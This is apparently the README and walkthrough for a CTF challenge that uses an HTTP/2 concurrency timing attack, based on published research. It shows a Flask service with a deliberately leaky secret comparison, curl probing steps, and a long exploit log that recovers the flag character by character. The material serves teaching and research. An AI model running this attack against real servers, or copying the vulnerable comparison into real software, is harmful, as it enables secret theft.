# Spaceless Spacing

Presentation about the challenge released at WCTF 2020: [https://www.youtube.com/watch?v=Oz0NtokfbqU](https://www.youtube.com/watch?v=Oz0NtokfbqU).

Presentation slides: [slides.pdf](/slides.pdf).

This challenge is based off of [Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connections](https://www.usenix.org/system/files/sec20-van_goethem.pdf).

The exploit is also based off of the repo associated with this paper: [DistriNet/timeless-timing-attacks](https://github.com/DistriNet/timeless-timing-attacks).

# Abstract
To perform successful remote timing attacks, an adversary typically collects a series of network timing measurements and subsequently performs statistical analysis to reveal a difference in execution time.
The number of measurements that must be obtained largely depends on the amount of jitter that the requests and responses are subjected to.
In remote timing attacks, a significant source of jitter is the network path between the adversary and the targeted server, making it practically infeasible to successfully exploit timing side-channels that exhibit only a small difference in execution time.

In this paper, we introduce a conceptually novel type of timing attack that leverages the coalescing of packets by network protocols and concurrent handling of requests by applications.
These concurrency-based timing attacks infer a relative timing difference by analyzing the order in which responses are returned, and thus do not rely on any absolute timing information.
We show how these attacks result in a 100-fold improvement over typical timing attacks performed over the Internet, and can accurately detect timing differences as small as 100ns, similar to attacks launched on a local system.
We describe how these timing attacks can be successfully deployed against HTTP/2 webservers, Tor onion services, and EAP-pwd, a popular Wi-Fi authentication method.

# Build and Running

## Challenge

```sh
docker build -t spaceless-spacing .
docker run -it --rm -p 4242:80 -e SECRET='flag{test}' spaceless-spacing
```

The enviornment variable `SECRET` can be changed to whatever, so long as it does not contain spaces.

Environment variables `NGINX_WORKER_PROCESSES`, `UWSGI_CHEAPER`, and `UWSGI_PROCESSES` should theoretically be able to scale the challenge up, but these have not been extensively tested.

## Exploit

```sh
docker build -t spaceless-spacing-exploit -f Dockerfile.exploit .
docker run -it --rm --network=host -e TARGET='http://localhost:4242' spaceless-spacing-exploit
```

The environment variable `TARGET` controls what endpoint to launch the exploit against.

The exploit assumes that the character set of the SECRET is `abcdefghijklmnopqrstuvwxyz{}`.
This can be altered by modifying `SECRET_CHARSET` inside [exploit/exploit.py](exploit/exploit.py).

The exploit also assumes a character outside of the character set of the SECRET is `*`.
This can be altered by modifying `COMPARISON_CHAR` inside [exploit/exploit.py](exploit/exploit.py).

The exploit has tuning parameters `TIMING_ITERATIONS = 1` and `NUM_REQUEST_PAIRS = 10` inside [exploit/exploit.py](exploit/exploit.py).
These tuning parameters control how many times to attempt to test a particular character guess for the secret.
The current values have worked for me, but you may wish to increase them if the exploit isn't working.

The flag `--network=host` is necessary if the challenge is running locally.

# Walkthrough

We know there is a challenge on some port.

First we try connecting to it and sending some random data to see how it responds:
```sh
$ nc localhost 4242 | hexdump -C
random_data
00000000  00 00 12 04 00 00 00 00  00 00 03 00 00 00 80 00  |................|
00000010  04 00 01 00 00 00 05 00  ff ff ff 00 00 04 08 00  |................|
```

Who knows what that means.
Google does.
Just googling for the first line of binary data mentions HTTP, and more specifically, HTTP2.

Let's try curl:
```sh
$ curl localhost:4242/
curl: (1) Received HTTP/0.9 when not allowed
```

Maybe that is a good sign that we're on the right track, but for some reason curl isn't going to just work out of the box for us.
More googling.

Some documentation reveals `curl offers the --http2 command line option to enable use of HTTP/2.`:
```sh
$ curl --http2 localhost:4242/
curl: (1) Received HTTP/0.9 when not allowed
```

Useless.
More googling.

Some documentation revealts `curl offers the --http2-prior-knowledge command line option to enable use of HTTP/2 without HTTP/1.1 Upgrade.`:
```sh
$ curl --http2-prior-knowledge localhost:4242/
#!/usr/bin/env python

import os
import time

from flask import Flask

app = Flask(__name__)

SECRET = os.environ["SECRET"]
assert " " not in SECRET

PLANCK_TIME = 5.391247 * 10 ** -44


@app.route("/")
def index():
    with open(__file__) as f:
        return f.read()


@app.route("/<secret>")
def check_secret(secret):
    if len(secret) != len(SECRET):
        return "SPACELESS SPACING!"
    for a, b in zip(secret, SECRET):
        if a == " ":
            continue
        elif a != b:
            return "INCORRECT!"
        else:
            time.sleep(PLANCK_TIME)
    if " " in secret:
        return "INCORRECT!"
    return "CORRECT!"
```

Bingo!

Lets test the `check_secret` route:
```sh
$ curl --http2-prior-knowledge localhost:4242/test
SPACELESS SPACING!%
```

Seems like its working.

We should be able to quickly bruteforce the secret length:
```sh
$ curl --http2-prior-knowledge localhost:4242/a
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/ab
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abc
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcd
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcde
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcdef
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcdefg
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcdefgh
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcdefghi
SPACELESS SPACING!%
~
$ curl --http2-prior-knowledge localhost:4242/abcdefghij
INCORRECT!%
```

Looks like the secret length is 10.

Custom string compare with a sleep: sounds like a timing side channel.
But how can we possibly do a timing side channel on a remote server when the timing side channel is such a small sleep?!
Surely the network jitter will make timing this impossible!

Google.

What's this?
A recent paper published in a top tier security conference titled "Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connections".
And the name of the challenge is "Spaceless Spacing"?
Seems like the answer to me.

According to this paper, we can overcome network jitter in HTTP2 timing side channels through this new novel technique in which we coalesce multiple requests into a single network packet.
With the two requets running simultaneously without network variance to throw off our timing, we can simply check which response comes back first.

Although the challenge sleeps for the smallest unit of time within our laws of physics, this is nevertheless subject to the kernel performing a context switch.

According to google `A context switch could take anywhere from a few 100 nanoseconds to few microseconds depending upon the CPU architecture and the size of the context that is to be saved and restored.`

According to the paper, they are able to measure time differences on this scale.

Now we just need to send several instances of simulatenous requests that measure how long a guessed byte in the secret takes compared to a presumed byte outside of the character set of the secret.
Doing this for every possible byte in the character set of the secret, at every offset into the secret, we can use basic statistics to determine which character takes on average the longest, or in the context of this technique, which response comes back second most often.
This works because if the guessed value is correct, we will perform one context switch, whereas if it's incorrect we will not perform a context switch, and this amount of time is enough to decide which request receives a response first.
By using spaces for all bytes other than the offset we are guessing for, we can reduce the variance to be just 1 context switch vs 0 context switches, rather than `n` context switches vs `n-1` context switches.
This should make the exploit more reliable, especially under a heavy load in which there might be a lot of variance in how long context switches can take.
That being said, the exploit does still work even without this space trick.

The paper also points us to their github repo as a starting point for our exploit: [https://github.com/DistriNet/timeless-timing-attacks](https://github.com/DistriNet/timeless-timing-attacks).

As we can see with the demo below, the exploit works!

# Exploit Demo

```
INFO:exploit:
INFO:exploit:Secret Length: 10
INFO:exploit:
INFO:exploit:Tested: a -- 9 11
INFO:exploit:Tested: b -- 10 10
INFO:exploit:Tested: c -- 11 9
INFO:exploit:Tested: d -- 11 9
INFO:exploit:Tested: e -- 10 10
INFO:exploit:Tested: f -- 19 1
INFO:exploit:Tested: g -- 12 8
INFO:exploit:Tested: h -- 10 10
INFO:exploit:Tested: i -- 11 9
INFO:exploit:Tested: j -- 11 9
INFO:exploit:Tested: k -- 11 9
INFO:exploit:Tested: l -- 12 8
INFO:exploit:Tested: m -- 9 11
INFO:exploit:Tested: n -- 10 10
INFO:exploit:Tested: o -- 11 9
INFO:exploit:Tested: p -- 11 9
INFO:exploit:Tested: q -- 9 11
INFO:exploit:Tested: r -- 11 9
INFO:exploit:Tested: s -- 9 11
INFO:exploit:Tested: t -- 8 12
INFO:exploit:Tested: u -- 8 12
INFO:exploit:Tested: v -- 10 10
INFO:exploit:Tested: w -- 10 10
INFO:exploit:Tested: x -- 11 9
INFO:exploit:Tested: y -- 10 10
INFO:exploit:Tested: z -- 11 9
INFO:exploit:Tested: { -- 10 10
INFO:exploit:Tested: } -- 9 11
INFO:exploit:
INFO:exploit:Secret Progress: f
INFO:exploit:Secret Progress took: 6.569067716598511s
INFO:exploit:
INFO:exploit:Tested: fa -- 11 9
INFO:exploit:Tested: fb -- 9 11
INFO:exploit:Tested: fc -- 10 10
INFO:exploit:Tested: fd -- 10 10
INFO:exploit:Tested: fe -- 8 12
INFO:exploit:Tested: ff -- 9 11
INFO:exploit:Tested: fg -- 8 12
INFO:exploit:Tested: fh -- 9 11
INFO:exploit:Tested: fi -- 9 11
INFO:exploit:Tested: fj -- 10 10
INFO:exploit:Tested: fk -- 10 10
INFO:exploit:Tested: fl -- 19 1
INFO:exploit:Tested: fm -- 8 12
INFO:exploit:Tested: fn -- 9 11
INFO:exploit:Tested: fo -- 12 8
INFO:exploit:Tested: fp -- 9 11
INFO:exploit:Tested: fq -- 9 11
INFO:exploit:Tested: fr -- 9 11
INFO:exploit:Tested: fs -- 8 12
INFO:exploit:Tested: ft -- 10 10
INFO:exploit:Tested: fu -- 9 11
INFO:exploit:Tested: fv -- 8 12
INFO:exploit:Tested: fw -- 10 10
INFO:exploit:Tested: fx -- 9 11
INFO:exploit:Tested: fy -- 8 12
INFO:exploit:Tested: fz -- 9 11
INFO:exploit:Tested: f{ -- 8 12
INFO:exploit:Tested: f} -- 11 9
INFO:exploit:
INFO:exploit:Secret Progress: fl
INFO:exploit:Secret Progress took: 6.579645395278931s
INFO:exploit:
INFO:exploit:Tested: fla -- 16 4
INFO:exploit:Tested: flb -- 7 13
INFO:exploit:Tested: flc -- 10 10
INFO:exploit:Tested: fld -- 8 12
INFO:exploit:Tested: fle -- 8 12
INFO:exploit:Tested: flf -- 9 11
INFO:exploit:Tested: flg -- 10 10
INFO:exploit:Tested: flh -- 8 12
INFO:exploit:Tested: fli -- 11 9
INFO:exploit:Tested: flj -- 10 10
INFO:exploit:Tested: flk -- 10 10
INFO:exploit:Tested: fll -- 7 13
INFO:exploit:Tested: flm -- 8 12
INFO:exploit:Tested: fln -- 6 14
INFO:exploit:Tested: flo -- 9 11
INFO:exploit:Tested: flp -- 8 12
INFO:exploit:Tested: flq -- 7 13
INFO:exploit:Tested: flr -- 6 14
INFO:exploit:Tested: fls -- 10 10
INFO:exploit:Tested: flt -- 8 12
INFO:exploit:Tested: flu -- 9 11
INFO:exploit:Tested: flv -- 8 12
INFO:exploit:Tested: flw -- 5 15
INFO:exploit:Tested: flx -- 9 11
INFO:exploit:Tested: fly -- 5 15
INFO:exploit:Tested: flz -- 7 13
INFO:exploit:Tested: fl{ -- 8 12
INFO:exploit:Tested: fl} -- 8 12
INFO:exploit:
INFO:exploit:Secret Progress: fla
INFO:exploit:Secret Progress took: 6.561330795288086s
INFO:exploit:
INFO:exploit:Tested: flaa -- 10 10
INFO:exploit:Tested: flab -- 11 9
INFO:exploit:Tested: flac -- 10 10
INFO:exploit:Tested: flad -- 11 9
INFO:exploit:Tested: flae -- 11 9
INFO:exploit:Tested: flaf -- 10 10
INFO:exploit:Tested: flag -- 18 2
INFO:exploit:Tested: flah -- 8 12
INFO:exploit:Tested: flai -- 9 11
INFO:exploit:Tested: flaj -- 8 12
INFO:exploit:Tested: flak -- 10 10
INFO:exploit:Tested: flal -- 11 9
INFO:exploit:Tested: flam -- 10 10
INFO:exploit:Tested: flan -- 14 6
INFO:exploit:Tested: flao -- 10 10
INFO:exploit:Tested: flap -- 9 11
INFO:exploit:Tested: flaq -- 9 11
INFO:exploit:Tested: flar -- 10 10
INFO:exploit:Tested: flas -- 9 11
INFO:exploit:Tested: flat -- 10 10
INFO:exploit:Tested: flau -- 10 10
INFO:exploit:Tested: flav -- 10 10
INFO:exploit:Tested: flaw -- 10 10
INFO:exploit:Tested: flax -- 10 10
INFO:exploit:Tested: flay -- 5 15
INFO:exploit:Tested: flaz -- 11 9
INFO:exploit:Tested: fla{ -- 6 14
INFO:exploit:Tested: fla} -- 10 10
INFO:exploit:
INFO:exploit:Secret Progress: flag
INFO:exploit:Secret Progress took: 6.581869125366211s
INFO:exploit:
INFO:exploit:Tested: flaga -- 12 8
INFO:exploit:Tested: flagb -- 11 9
INFO:exploit:Tested: flagc -- 10 10
INFO:exploit:Tested: flagd -- 11 9
INFO:exploit:Tested: flage -- 10 10
INFO:exploit:Tested: flagf -- 10 10
INFO:exploit:Tested: flagg -- 10 10
INFO:exploit:Tested: flagh -- 11 9
INFO:exploit:Tested: flagi -- 11 9
INFO:exploit:Tested: flagj -- 7 13
INFO:exploit:Tested: flagk -- 11 9
INFO:exploit:Tested: flagl -- 10 10
INFO:exploit:Tested: flagm -- 10 10
INFO:exploit:Tested: flagn -- 11 9
INFO:exploit:Tested: flago -- 10 10
INFO:exploit:Tested: flagp -- 11 9
INFO:exploit:Tested: flagq -- 13 7
INFO:exploit:Tested: flagr -- 14 6
INFO:exploit:Tested: flags -- 11 9
INFO:exploit:Tested: flagt -- 10 10
INFO:exploit:Tested: flagu -- 10 10
INFO:exploit:Tested: flagv -- 10 10
INFO:exploit:Tested: flagw -- 10 10
INFO:exploit:Tested: flagx -- 13 7
INFO:exploit:Tested: flagy -- 11 9
INFO:exploit:Tested: flagz -- 10 10
INFO:exploit:Tested: flag{ -- 20 0
INFO:exploit:Tested: flag} -- 10 10
INFO:exploit:
INFO:exploit:Secret Progress: flag{
INFO:exploit:Secret Progress took: 6.574876308441162s
INFO:exploit:
INFO:exploit:Tested: flag{a -- 10 10
INFO:exploit:Tested: flag{b -- 9 11
INFO:exploit:Tested: flag{c -- 10 10
INFO:exploit:Tested: flag{d -- 11 9
INFO:exploit:Tested: flag{e -- 10 10
INFO:exploit:Tested: flag{f -- 10 10
INFO:exploit:Tested: flag{g -- 10 10
INFO:exploit:Tested: flag{h -- 10 10
INFO:exploit:Tested: flag{i -- 9 11
INFO:exploit:Tested: flag{j -- 10 10
INFO:exploit:Tested: flag{k -- 10 10
INFO:exploit:Tested: flag{l -- 11 9
INFO:exploit:Tested: flag{m -- 10 10
INFO:exploit:Tested: flag{n -- 10 10
INFO:exploit:Tested: flag{o -- 10 10
INFO:exploit:Tested: flag{p -- 10 10
INFO:exploit:Tested: flag{q -- 10 10
INFO:exploit:Tested: flag{r -- 9 11
INFO:exploit:Tested: flag{s -- 10 10
INFO:exploit:Tested: flag{t -- 18 2
INFO:exploit:Tested: flag{u -- 10 10
INFO:exploit:Tested: flag{v -- 10 10
INFO:exploit:Tested: flag{w -- 10 10
INFO:exploit:Tested: flag{x -- 10 10
INFO:exploit:Tested: flag{y -- 9 11
INFO:exploit:Tested: flag{z -- 10 10
INFO:exploit:Tested: flag{{ -- 10 10
INFO:exploit:Tested: flag{} -- 11 9
INFO:exploit:
INFO:exploit:Secret Progress: flag{t
INFO:exploit:Secret Progress took: 6.57136344909668s
INFO:exploit:
INFO:exploit:Tested: flag{ta -- 11 9
INFO:exploit:Tested: flag{tb -- 10 10
INFO:exploit:Tested: flag{tc -- 8 12
INFO:exploit:Tested: flag{td -- 10 10
INFO:exploit:Tested: flag{te -- 16 4
INFO:exploit:Tested: flag{tf -- 10 10
INFO:exploit:Tested: flag{tg -- 10 10
INFO:exploit:Tested: flag{th -- 9 11
INFO:exploit:Tested: flag{ti -- 8 12
INFO:exploit:Tested: flag{tj -- 10 10
INFO:exploit:Tested: flag{tk -- 10 10
INFO:exploit:Tested: flag{tl -- 8 12
INFO:exploit:Tested: flag{tm -- 10 10
INFO:exploit:Tested: flag{tn -- 10 10
INFO:exploit:Tested: flag{to -- 9 11
INFO:exploit:Tested: flag{tp -- 9 11
INFO:exploit:Tested: flag{tq -- 10 10
INFO:exploit:Tested: flag{tr -- 9 11
INFO:exploit:Tested: flag{ts -- 10 10
INFO:exploit:Tested: flag{tt -- 10 10
INFO:exploit:Tested: flag{tu -- 10 10
INFO:exploit:Tested: flag{tv -- 11 9
INFO:exploit:Tested: flag{tw -- 11 9
INFO:exploit:Tested: flag{tx -- 10 10
INFO:exploit:Tested: flag{ty -- 11 9
INFO:exploit:Tested: flag{tz -- 9 11
INFO:exploit:Tested: flag{t{ -- 10 10
INFO:exploit:Tested: flag{t} -- 10 10
INFO:exploit:
INFO:exploit:Secret Progress: flag{te
INFO:exploit:Secret Progress took: 6.608777284622192s
INFO:exploit:
INFO:exploit:Tested: flag{tea -- 11 9
INFO:exploit:Tested: flag{teb -- 11 9
INFO:exploit:Tested: flag{tec -- 11 9
INFO:exploit:Tested: flag{ted -- 9 11
INFO:exploit:Tested: flag{tee -- 10 10
INFO:exploit:Tested: flag{tef -- 13 7
INFO:exploit:Tested: flag{teg -- 10 10
INFO:exploit:Tested: flag{teh -- 11 9
INFO:exploit:Tested: flag{tei -- 11 9
INFO:exploit:Tested: flag{tej -- 9 11
INFO:exploit:Tested: flag{tek -- 10 10
INFO:exploit:Tested: flag{tel -- 10 10
INFO:exploit:Tested: flag{tem -- 10 10
INFO:exploit:Tested: flag{ten -- 11 9
INFO:exploit:Tested: flag{teo -- 10 10
INFO:exploit:Tested: flag{tep -- 11 9
INFO:exploit:Tested: flag{teq -- 9 11
INFO:exploit:Tested: flag{ter -- 10 10
INFO:exploit:Tested: flag{tes -- 15 5
INFO:exploit:Tested: flag{tet -- 10 10
INFO:exploit:Tested: flag{teu -- 10 10
INFO:exploit:Tested: flag{tev -- 10 10
INFO:exploit:Tested: flag{tew -- 10 10
INFO:exploit:Tested: flag{tex -- 8 12
INFO:exploit:Tested: flag{tey -- 11 9
INFO:exploit:Tested: flag{tez -- 11 9
INFO:exploit:Tested: flag{te{ -- 11 9
INFO:exploit:Tested: flag{te} -- 12 8
INFO:exploit:
INFO:exploit:Secret Progress: flag{tes
INFO:exploit:Secret Progress took: 6.536858081817627s
INFO:exploit:
INFO:exploit:Tested: flag{tesa -- 9 11
INFO:exploit:Tested: flag{tesb -- 10 10
INFO:exploit:Tested: flag{tesc -- 10 10
INFO:exploit:Tested: flag{tesd -- 9 11
INFO:exploit:Tested: flag{tese -- 10 10
INFO:exploit:Tested: flag{tesf -- 10 10
INFO:exploit:Tested: flag{tesg -- 9 11
INFO:exploit:Tested: flag{tesh -- 10 10
INFO:exploit:Tested: flag{tesi -- 10 10
INFO:exploit:Tested: flag{tesj -- 9 11
INFO:exploit:Tested: flag{tesk -- 10 10
INFO:exploit:Tested: flag{tesl -- 10 10
INFO:exploit:Tested: flag{tesm -- 10 10
INFO:exploit:Tested: flag{tesn -- 10 10
INFO:exploit:Tested: flag{teso -- 9 11
INFO:exploit:Tested: flag{tesp -- 10 10
INFO:exploit:Tested: flag{tesq -- 11 9
INFO:exploit:Tested: flag{tesr -- 10 10
INFO:exploit:Tested: flag{tess -- 10 10
INFO:exploit:Tested: flag{test -- 20 0
INFO:exploit:Tested: flag{tesu -- 11 9
INFO:exploit:Tested: flag{tesv -- 10 10
INFO:exploit:Tested: flag{tesw -- 10 10
INFO:exploit:Tested: flag{tesx -- 12 8
INFO:exploit:Tested: flag{tesy -- 11 9
INFO:exploit:Tested: flag{tesz -- 10 10
INFO:exploit:Tested: flag{tes{ -- 10 10
INFO:exploit:Tested: flag{tes} -- 10 10
INFO:exploit:
INFO:exploit:Secret Progress: flag{test
INFO:exploit:Secret Progress took: 6.609140872955322s
INFO:exploit:
INFO:exploit:Tested: flag{testa -- 10 10
INFO:exploit:Tested: flag{testb -- 11 9
INFO:exploit:Tested: flag{testc -- 12 8
INFO:exploit:Tested: flag{testd -- 9 11
INFO:exploit:Tested: flag{teste -- 10 10
INFO:exploit:Tested: flag{testf -- 9 11
INFO:exploit:Tested: flag{testg -- 10 10
INFO:exploit:Tested: flag{testh -- 11 9
INFO:exploit:Tested: flag{testi -- 10 10
INFO:exploit:Tested: flag{testj -- 11 9
INFO:exploit:Tested: flag{testk -- 11 9
INFO:exploit:Tested: flag{testl -- 9 11
INFO:exploit:Tested: flag{testm -- 10 10
INFO:exploit:Tested: flag{testn -- 10 10
INFO:exploit:Tested: flag{testo -- 10 10
INFO:exploit:Tested: flag{testp -- 9 11
INFO:exploit:Tested: flag{testq -- 11 9
INFO:exploit:Tested: flag{testr -- 10 10
INFO:exploit:Tested: flag{tests -- 10 10
INFO:exploit:Tested: flag{testt -- 11 9
INFO:exploit:Tested: flag{testu -- 11 9
INFO:exploit:Tested: flag{testv -- 10 10
INFO:exploit:Tested: flag{testw -- 9 11
INFO:exploit:Tested: flag{testx -- 10 10
INFO:exploit:Tested: flag{testy -- 9 11
INFO:exploit:Tested: flag{testz -- 11 9
INFO:exploit:Tested: flag{test{ -- 10 10
INFO:exploit:Tested: flag{test} -- 18 2
INFO:exploit:
INFO:exploit:Secret Progress: flag{test}
INFO:exploit:Secret Progress took: 6.5959882736206055s
INFO:exploit:
INFO:exploit:
INFO:exploit:Secret: flag{test}
INFO:exploit:Correct: True
INFO:exploit:
```
